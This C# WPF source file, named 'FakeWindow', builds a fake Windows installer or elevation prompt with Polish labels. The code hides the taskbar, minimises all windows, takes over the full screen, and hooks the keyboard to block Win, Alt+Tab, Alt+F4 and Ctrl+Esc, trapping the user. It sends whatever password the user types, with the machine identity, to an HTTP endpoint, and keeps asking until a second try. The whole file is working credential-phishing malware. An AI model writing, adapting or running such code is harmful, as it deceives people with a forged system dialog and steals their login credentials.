using System.ComponentModel;
using System.Diagnostics;
using System.Management;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Imaging;

namespace FakeWindow
{
    public partial class MainWindow : Window
    {
		[DllImport("user32.dll")] private static extern int FindWindow(string lpClassName, string lpWindowName);
		[DllImport("user32.dll")] private static extern int ShowWindow(int hwnd, int nCmdShow);
		[DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)] static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName);
		[DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);

		private static IntPtr _hookID = IntPtr.Zero;
		private static LowLevelKeyboardProc _proc = HookCallback;
		private const int SW_HIDE = 0, SW_SHOW = 5, WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104, VK_LWIN = 0x5B, VK_RWIN = 0x5C, VK_TAB = 0x09, VK_ESCAPE = 0x1B, VK_CONTROL = 0x11, VK_MENU = 0x12, VK_SHIFT = 0x10, VK_F4 = 0x73;
		const int WM_COMMAND = 0x111, MIN_ALL = 419, MIN_ALL_UNDO = 416;
		private int lHwnd = FindWindow("Shell_TrayWnd", null);
		private bool close = false;
		private int counter = 0;

		// icon, name, publisher, path
		string[] data = { "icon.png", "program.exe", "Private Publisher",  "C:/Users/User1/Downloads/program.exe"};

		public MainWindow()
        {
            InitializeComponent();
            Init();
        }

        public void Init() {
			ShowWindow(lHwnd, SW_HIDE);
			SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
			_hookID = SetHook(_proc);
			this.Left = 0;
			this.Top = 0;
			this.WindowState = WindowState.Maximized;
			this.Topmost = true;
			this.Title = data[1] + "installer";
			this.Closing += onExit;

			icon.Source = new BitmapImage(new Uri("./Images/" + data[0], UriKind.RelativeOrAbsolute));
            name.Text = data[1];
            publisher.Text = "Zweryfikowany wydawca: " + data[2];
            location.Text = "Lokalizacja programu: " + data[3];

			var collection = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem").Get();

			admin_user.Text = collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split("\\").LastOrDefault("Unknown");

			admin_user_path.Text = WindowsIdentity.GetCurrent()?.Name ?? "Unknown";
		}

		private void ShowMore(object sender, MouseButtonEventArgs e)
		{
            if (e.LeftButton == MouseButtonState.Pressed) {
                if (properties.Text.Contains("Pokaż"))
                {
                    location.Visibility = Visibility.Visible;
                    properties.Text = "Ukryj szczegóły";
                }
                else
                {
                    location.Visibility = Visibility.Collapsed;
                    properties.Text = "Pokaż więcej szczegółów";
				}
			}
		}


		private void Exit()
		{
			ShowWindow(lHwnd, SW_SHOW);
			SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
			UnhookWindowsHookEx(_hookID);
			close = true;
			Environment.Exit(0);
		}

		private void onExit(object sender, CancelEventArgs e)
		{
			if (!close)
			{
				e.Cancel = true;
			}
		}

		private void Close_Btn(object sender, MouseButtonEventArgs e)
		{
			if (e.ChangedButton == MouseButton.Left) {
				Exit();
			}
		}

		private void Cancel_Btn(object sender, RoutedEventArgs e)
		{
			Exit();
		}

		private void Confirm_Btn(object sender, RoutedEventArgs e)
		{
			string pass = password.Password;

			if (pass == null || pass == "")
			{
				error.Visibility = Visibility.Visible;
			}

			_ = SendData(pass);

			counter++;
			if (counter == 2)
			{
				Exit();
			}
			else { 
				error.Visibility = Visibility.Visible;
			}
		}

		private async Task SendData(string pass) {

			HttpClient httpClient = new HttpClient();
			string key = Uri.EscapeDataString("API_KEY");
			string pc = Uri.EscapeDataString(WindowsIdentity.GetCurrent()?.Name ?? "Unknown");
			string passEnc = Uri.EscapeDataString(pass);

			string url = $"http://localhost:9876/api/send?key={key}&id=10&pc={pc}&pass={passEnc}";

			try
			{
				await httpClient.GetAsync(url);
			}
			catch (Exception ex) { }
		}

		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
		private static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			using (Process curProcess = Process.GetCurrentProcess())
			using (ProcessModule curModule = curProcess.MainModule)
			{
				return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
					GetModuleHandle(curModule.ModuleName), 0);
			}
		}
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
			{
				int vkCode = Marshal.ReadInt32(lParam);

				bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
				bool alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
				bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

				if (vkCode == VK_LWIN || vkCode == VK_RWIN)
					return (IntPtr)1;

				if (alt && (vkCode == VK_TAB || vkCode == VK_F4))
					return (IntPtr)1;

				if (ctrl && ((vkCode == VK_ESCAPE) || (shift && vkCode == VK_ESCAPE)))
					return (IntPtr)1;
			}
			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}

	}
}